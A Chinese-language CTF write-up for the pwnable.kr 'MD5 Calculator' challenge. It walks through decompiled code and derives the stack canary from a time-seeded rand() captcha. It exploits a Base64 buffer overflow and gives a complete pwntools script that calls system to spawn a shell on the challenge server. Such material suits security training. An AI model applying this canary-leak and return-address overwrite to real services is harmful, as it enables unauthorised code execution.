# MD5 Calculator

```
We made a simple MD5 calculator as a network service.
Find a bug and exploit it to get a shell.

Download : http://pwnable.kr/bin/hash
hint : this service shares the same machine with pwnable.kr web service

Running at : nc pwnable.kr 9002
```

直接拖进 `ida` `F5` 得到
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int v5; // [esp+18h] [ebp-8h]
  int v6; // [esp+1Ch] [ebp-4h]

  setvbuf(stdout, 0, 1, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("- Welcome to the free MD5 calculating service -");
  v3 = time(0);
  srand(v3);
  v6 = my_hash();
  printf("Are you human? input captcha : %d\n", v6);
  __isoc99_scanf("%d", &v5);
  if ( v6 != v5 )
  {
    puts("wrong captcha!");
    exit(0);
  }
  puts("Welcome! you are authenticated.");
  puts("Encode your data with BASE64 then paste me!");
  process_hash();
  puts("Thank you for using our service.");
  system("echo `date` >> log");
  return 0;
}

int my_hash()
{
  signed int i; // [esp+0h] [ebp-38h]
  char v2[4]; // [esp+Ch] [ebp-2Ch]
  int v3; // [esp+10h] [ebp-28h]
  int v4; // [esp+14h] [ebp-24h]
  int v5; // [esp+18h] [ebp-20h]
  int v6; // [esp+1Ch] [ebp-1Ch]
  int v7; // [esp+20h] [ebp-18h]
  int v8; // [esp+24h] [ebp-14h]
  int v9; // [esp+28h] [ebp-10h]
  unsigned int v10; // [esp+2Ch] [ebp-Ch]

  v10 = __readgsdword(0x14u);
  for ( i = 0; i <= 7; ++i )
    *(_DWORD *)&v2[4 * i] = rand();
  return v6 - v8 + v9 + v10 + v4 - v5 + v3 + v7;
}

unsigned int process_hash()
{
  int v0; // ST14_4
  char *ptr; // ST18_4
  char v3; // [esp+1Ch] [ebp-20Ch]
  unsigned int v4; // [esp+21Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  memset(&v3, 0, 0x200u);
  while ( getchar() != 10 )
    ;
  memset(g_buf, 0, sizeof(g_buf));
  fgets(g_buf, 1024, stdin);
  memset(&v3, 0, 0x200u);
  v0 = Base64Decode(g_buf, (int)&v3);
  ptr = calc_md5((int)&v3, v0);
  printf("MD5(data) : %s\n", ptr);
  free(ptr);
  return __readgsdword(0x14u) ^ v4;
}
```

先看逻辑：

`main` 函数： 大致就是取当前时间作为随机种子,然后调用`myhash`函数，把调用结果与接下来输入的值进行比对. 如果相同就进行下一步 `process_hash` ,然后再执行 `system("echo `date` >> log");`

`ny_hash` 函数: 定义一堆局部变量,然后一直 `rand` 取值赋值给它们， 然后做一些计算赋值，这里我们发现 `unsigned int v10; // [esp+2Ch] [ebp-Ch]` `v10` 也参与了计算，这个是 `canary`
(其实`canary`的位置有时候并不是固定的，大致就是在`ebp -0x8` `ebp -0xc`) 这几个啥的位置

`process_hash` 函数: 读 `stdin` 到 `g_buf` 里,然后`base64decode`到`v3`里，然后又计算 `v3` 的 `md5`, 输出.(这里存在栈溢出`1024 > 0x200`)

试着运行一下
```
➜  md5-calculator (attenuation@Attenuation-hp) echo 'hello' | base64
aGVsbG8K
➜  md5-calculator (attenuation@Attenuation-hp) ./hash
- Welcome to the free MD5 calculating service -
Are you human? input captcha : -629909350
-629909350
Welcome! you are authenticated.
Encode your data with BASE64 then paste me!
aGVsbG8K
MD5(data) : b1946ac92492d2347c6235b4d2611184
Thank you for using our service.
➜  md5-calculator (attenuation@Attenuation-hp)
```

checksec查看保护
```
gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
开启了 `canary` 和 `栈不可执行` 保护.
我们函数里面也有 `system` 的函数调用，直接利用`my_hash`得出程序的`canary`，然后覆盖 `process_hash` 函数的返回地址. 至于`/bin/sh`呢,我们利用现成的`process_hash`的输入`g_buf`指定的地址(这个在.data节)，然后给`system`函数赋 `/bin/sh` 的地址

ps : 这里有一个坑，我们不能直接把数据写进第一次输入的地方让他`decode`解出来，因为大部分操作系统都是开启 `alsr` 的, 栈地址基本都是难以确定的 (

直接上write-up: (直接打因为时间问题可能会有坑，canary过不了，自己稍微改一下去他们本机打,应该会过了)

```
from pwn import *
context(arch='i386',os='linux',log_level='debug')
import ctypes
import sys

ll = ctypes.cdll.LoadLibrary
lib = ll('libc.so.6')
elf_s = ELF('./hash')

if sys.argv[1] == 'connect':
    bin = remote('pwnable.kr',9002)
else:
    bin = process('./hash')

lib.srand(lib.time(0)) //种子相同的话就可以拿到一样的随机数了
v2 = lib.rand()
v3 = lib.rand()
v4 = lib.rand()
v5 = lib.rand()
v6 = lib.rand()
v7 = lib.rand()
v8 = lib.rand()
v9 = lib.rand()


system_plt = elf_s.symbols['system']
process_hash = elf_s.symbols['process_hash']
bin.recvuntil(': ')
sum_v = int(bin.recvuntil('\n'))
canary = sum_v + v8 + v5 - v6 - v9 - v4 - v3 - v7
canary = canary & 0xffffffff
log.success('canary is : '+ hex(canary))
payload = 'a'*0x200
payload += p32(canary) + 'a'*0xc
payload += p32(process_hash) + p32(system_plt) + 'a'*4 + p32(0x0804B0E0)
payload = base64.b64encode(payload)
bin.sendline(str(sum_v))
bin.sendline(payload)
bin.sendline('/bin/bash')
bin.recvuntil('\n')
#gdb.attach(bin)
bin.interactive()
```
